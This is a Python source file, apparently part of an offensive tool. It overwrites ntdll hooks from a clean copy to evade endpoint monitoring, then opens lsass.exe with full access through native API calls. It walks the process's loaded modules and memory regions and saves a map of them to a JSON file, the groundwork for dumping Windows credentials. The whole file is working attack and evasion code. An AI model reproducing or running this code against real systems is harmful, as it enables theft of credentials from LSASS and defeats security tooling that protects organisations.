import os
import sys
import json
import psutil
import ctypes
from ctypes import wintypes
import warnings
warnings.filterwarnings("ignore", category=DeprecationWarning)
import argparse
from overwrite import overwrite_disk, overwrite_knowndlls, overwrite_debugproc

# Constants
PROCESS_ALL_ACCESS = 0x1F0FFF
MemoryBasicInformation = 0
ProcessBasicInformation = 0 
PAGE_NOACCESS = 0x01
MEM_COMMIT = 0x00001000


# Structures
class PROCESS_BASIC_INFORMATION(ctypes.Structure):
    _fields_ = [
        ("Reserved1", wintypes.LPVOID),
        ("PebBaseAddress", wintypes.LPVOID),
        ("Reserved2", wintypes.LPVOID * 2),
        ("UniqueProcessId", wintypes.HANDLE),
        ("Reserved3", wintypes.LPVOID)
    ]

class MEMORY_BASIC_INFORMATION(ctypes.Structure):
    _fields_ = [
        ('BaseAddress', wintypes.LPVOID),
        ('AllocationBase', wintypes.LPVOID),
        ('AllocationProtect', wintypes.DWORD),
        ('RegionSize', ctypes.c_size_t),
        ('State', wintypes.DWORD),
        ('Protect', wintypes.DWORD),
        ('Type', wintypes.DWORD)
    ]

class CLIENT_ID(ctypes.Structure):
    _fields_ = [
        ("UniqueProcess", wintypes.HANDLE),
        ("UniqueThread", wintypes.HANDLE)
    ]

class OBJECT_ATTRIBUTES(ctypes.Structure):
    _fields_ = [
        ("Length", wintypes.ULONG),
        ("RootDirectory", wintypes.HANDLE),
        ("ObjectName", wintypes.LPVOID),
        ("Attributes", wintypes.ULONG),
        ("SecurityDescriptor", wintypes.LPVOID),
        ("SecurityQualityOfService", wintypes.LPVOID)
    ]

def initialize_object_attributes():
    return OBJECT_ATTRIBUTES(
        Length=ctypes.sizeof(OBJECT_ATTRIBUTES),
        RootDirectory=None,
        ObjectName=None,
        Attributes=0,
        SecurityDescriptor=None,
        SecurityQualityOfService=None
    )


# NTAPI functions
ntdll = ctypes.WinDLL("ntdll")
NtQueryInformationProcess = ntdll.NtQueryInformationProcess
NtQueryInformationProcess.restype = wintypes.LONG
NtQueryInformationProcess.argtypes = [wintypes.HANDLE, wintypes.ULONG, wintypes.HANDLE, wintypes.ULONG, wintypes.PULONG]
NtReadVirtualMemory = ntdll.NtReadVirtualMemory
NtReadVirtualMemory.restype = wintypes.LONG
NtReadVirtualMemory.argtypes = [
    wintypes.HANDLE,    # ProcessHandle
    wintypes.LPVOID,    # BaseAddress
    wintypes.LPVOID,    # Buffer
    wintypes.ULONG,     # NumberOfBytesToRead
    wintypes.PULONG     # NumberOfBytesRead
]
NtQueryVirtualMemory = ntdll.NtQueryVirtualMemory
NtQueryVirtualMemory.restype = wintypes.DWORD
NtQueryVirtualMemory.argtypes = [
    wintypes.HANDLE,    # ProcessHandle
    wintypes.LPVOID,    # BaseAddress
    wintypes.DWORD,     # MemoryInformationClass
    wintypes.LPVOID,    # MemoryInformation
    wintypes.ULONG,     # MemoryInformationLength
    wintypes.LPVOID     # ReturnLength (optional)
]
NtOpenProcess = ntdll.NtOpenProcess
NtOpenProcess.restype = wintypes.LONG
NtOpenProcess.argtypes = [
    wintypes.HANDLE,    # ProcessHandle
    wintypes.DWORD,     # DesiredAccess
    wintypes.LPVOID,    # ObjectAttributes
    wintypes.LPVOID     # ClientId
]


def get_pid(process_name):
    for proc in psutil.process_iter(['pid', 'name']):
        if proc.info['name'] == process_name:
            return proc.info['pid']


def open_process(pid):
    process_handle = wintypes.HANDLE()
    obj_attributes = initialize_object_attributes()
    client_id = CLIENT_ID(
        UniqueProcess=ctypes.c_void_p(pid),
        UniqueThread=None
    )

    status = NtOpenProcess(
        ctypes.byref(process_handle),
        PROCESS_ALL_ACCESS,
        ctypes.byref(obj_attributes),
        ctypes.byref(client_id)
    )

    if status != 0 or not process_handle:
        print("[-] Could not open handle to the process. Not running as administrator maybe?")
        sys.exit(0)

    return process_handle


def read_remoteintptr(process_handle, mem_address):
    buffer = ctypes.create_string_buffer(8)
    bytes_read = wintypes.ULONG(0)
    status = NtReadVirtualMemory(
            process_handle,
            mem_address,
            buffer,
            8,
            ctypes.byref(bytes_read)
        )

    if status != 0:
        return

    read_bytes = buffer.raw[:bytes_read.value][::-1]
    read_int = int(str((read_bytes).hex()),16)
    return read_int 


def read_remoteWStr(process_handle, mem_address):
    buffer = ctypes.create_string_buffer(256)
    bytes_read = wintypes.ULONG(0)
    status = NtReadVirtualMemory(
            process_handle,
            mem_address,
            buffer,
            256,
            ctypes.byref(bytes_read)
        )

    if status != 0:
        return ""

    read_bytes = buffer.raw[:bytes_read.value]
    index = read_bytes.find(b'\x00\x00')
    unicode_str = (read_bytes[:index].decode('unicode-escape'))
    unicode_str_clean = "".join(char for char in unicode_str if char.isprintable())
    return unicode_str_clean 


def query_process_information(process_handle):
    process_information = PROCESS_BASIC_INFORMATION()
    return_length = wintypes.ULONG()
    status = NtQueryInformationProcess(
        process_handle,
        ProcessBasicInformation,
        ctypes.byref(process_information),
        ctypes.sizeof(process_information),
        ctypes.byref(return_length)
    )

    if status != 0:
        raise ctypes.WinError(ctypes.get_last_error())
    
    print("[+] PEB Base Address: \t" + str(hex(process_information.PebBaseAddress)))

    ldr_offset = 0x18
    ldr_pointer = process_information.PebBaseAddress + ldr_offset
    ldr_address = read_remoteintptr(process_handle, ldr_pointer)
    
    inInitializationOrderModuleList_offset = 0x30
    InInitializationOrderModuleList = ldr_address + inInitializationOrderModuleList_offset

    next_flink = read_remoteintptr(process_handle, InInitializationOrderModuleList)

    dll_base = 1337
    flink_dllbase_offset = 0x20
    flink_buffer_fulldllname_offset = 0x40
    flink_buffer_offset = 0x50

    moduleinfo_arr = []

    while (dll_base != 0):
        next_flink = next_flink - 0x10
        
        dll_base = read_remoteintptr(process_handle, (next_flink + flink_dllbase_offset))
        if dll_base == 0:
            break
        
        buffer = read_remoteintptr(process_handle, (next_flink + flink_buffer_offset))
        base_dll_name = read_remoteWStr(process_handle, buffer)

        buffer = read_remoteintptr(process_handle, (next_flink + flink_buffer_fulldllname_offset))
        full_dll_path = read_remoteWStr(process_handle, buffer)
        
        #print("[+] DLL Base Address: \t" + hex(dll_base))
        #print("[+] Base DLL name: \t" + base_dll_name)
        #print("[+] Full DLL path: \t" + full_dll_path)
        
        module_info = { 
            "field0" : base_dll_name, 
            "field1" : full_dll_path,
            "field2" : hex(dll_base),
            "field3" : 0
        }
        moduleinfo_arr.append(module_info)
        next_flink = read_remoteintptr(process_handle, (next_flink + 0x10))

    return moduleinfo_arr


def update_json_array(data, name_to_update, field_to_update, new_value):
    for obj in data:
        if obj.get('field0') == name_to_update:
            obj[field_to_update] = new_value
            break
    return data


def get_args():
    parser = argparse.ArgumentParser()
    parser.add_argument('-o', '--option', required=True, action='store', help='Option for library overwrite: \"disk\", \"knowndlls\" or \"debugproc\"')
    parser.add_argument('-p', '--path', required=False, default="", action='store', help='Path to ntdll file in disk (for \"disk\" option) or program to open in debug mode (\"debugproc\" option)')
    my_args = parser.parse_args()
    return my_args


def main():
    # Ntdll overwrite
    args = get_args()
    option = args.option
    if option == "disk":
        path = "C:\\Windows\\System32\\ntdll.dll"
        if args.path != "":
            path = args.path
        overwrite_disk(path)
    elif option == "knowndlls":
        overwrite_knowndlls()
    elif option == "debugproc":
        path = "c:\\windows\\system32\\calc.exe"
        if args.path != "":
            path = args.path
        overwrite_debugproc(path)
    else:
        pass

    pid_ = get_pid("lsass.exe")
    if pid_:
        print("[+] PID: \t\t" + str(pid_))
    else:
        print("[-] PID not found")
    process_handle = open_process(pid_)
    print("[+] Process handle: \t" + str(process_handle.value))

    moduleinfo_arr = query_process_information(process_handle)
    
    # Loop memory regions
    mem_address = 0
    proc_max_address_l = 0x7FFFFFFEFFFF
    aux_size = 0
    aux_name = ""

    while (mem_address < proc_max_address_l):
        memory_info = MEMORY_BASIC_INFORMATION()
        memory_info_size = ctypes.sizeof(memory_info)
        return_length = ctypes.c_size_t()

        status = NtQueryVirtualMemory(
            process_handle,
            mem_address,
            MemoryBasicInformation,
            ctypes.byref(memory_info),
            memory_info_size,
            ctypes.byref(return_length)
        )

        if memory_info.Protect != PAGE_NOACCESS and memory_info.State == MEM_COMMIT:
            matching_object = next((obj for obj in moduleinfo_arr if obj.get('field0') == aux_name), {"field0" : "0", "field1" : "0", "field2" : "0", "field3" : "0"})
            
            if memory_info.RegionSize == 0x1000 and memory_info.BaseAddress != matching_object.get("field2"):
                update_json_array(moduleinfo_arr, aux_name, "field3", aux_size)
                matching_object = next((obj for obj in moduleinfo_arr if obj.get('field0') == aux_name), {"field0" : "0", "field1" : "0", "field2" : "0", "field3" : "0"})
    
                for i in moduleinfo_arr:
                    if int(memory_info.BaseAddress) == int(i.get("field2"),16):
                        aux_name = i.get("field0")
                        aux_size = memory_info.RegionSize
            else:
                aux_size += memory_info.RegionSize
        
        mem_address += memory_info.RegionSize

    file_name = "shock.json"
    with open(file_name, 'w', encoding='utf-8') as f:
            json.dump(moduleinfo_arr, f, ensure_ascii=False)
    print("[+] File " + file_name + " generated.")


if __name__ == "__main__":
    main()